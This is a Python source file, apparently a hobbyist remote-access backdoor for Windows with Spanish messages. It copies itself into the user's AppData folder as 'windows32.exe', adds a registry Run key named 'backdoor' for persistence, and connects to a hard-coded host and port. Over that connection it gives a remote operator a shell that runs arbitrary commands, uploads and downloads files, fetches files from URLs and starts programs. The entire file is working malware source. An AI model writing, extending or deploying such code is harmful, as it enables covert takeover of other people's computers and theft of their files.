#!/usr/bin/env python
#_*_ conding:utf8_*_

import socket
import os
import subprocess
import base64
import requests
import time
import shutil
import sys

def create_persistence():
    location=os.environ['appdata'] +'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t  REG_SZ /d "'+location+ '"',shell=True)


def admin_check():
    global admin
    try:
        check=os.listdir(os.sep.join([os.environ.get("SystemRoot",'C:\windows'),'temp']))
    except:
        admin = "Error privilegios insuficientes"
    else:
        admin="Privilegios de administrador"

def connecction():
    while True:
        time.sleep(5)
        try:
            client.connect(("192.168.1.67",7776))
            shell()
        except:
            connecction()

def download_file(url):
    consulta= requests.get(url)
    name_file=url.split("/")[-1]
    with open(name_file,'wb') as fiile_get:
        fiile_get.write(consulta.content)


def shell():
    current_dir= os.getcwd()
    client.send(current_dir)
    while True:
        res= client.recv(1024)
        if res == "exit":
            break 
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result= os.getcwd()
            client.send(result)
        elif res[:8] == "download":
            with open(res[9:],'rb')as file_download:
                client.send(base64.b64decode(file_download.read()))
        elif res[:6]=="upload":
            with open(res[7:],'wb') as file_upload:
                data=client.recv(1024)
                file_upload.write(base64.b64decode(data))
        elif res[:3] == "get":
            try:
                download_file(res[4:])
                client.send("Archivo descargado correctamente")
            except:
                client.send("Ocurrio un error en la descarga")
        elif res[:5]=="start":
            try:
                subprocess.Popen(res[6:],shell=True)
                client.send("Programa iniciando con exito!!!")
            except:
                client.send("No se pudo iniciar el programa")
        elif res[:5]=="check":
            try:
                admin_check()
                client.send(admin)
            except:
                client.send("No se pudo realizar la tarea")

        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result=proc.stdout.read()+proc.stderr.read()
            if len(result)== 0:
                client.send("1")
            else:
                client.send(result)


create_persistence()
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connecction()
client.close()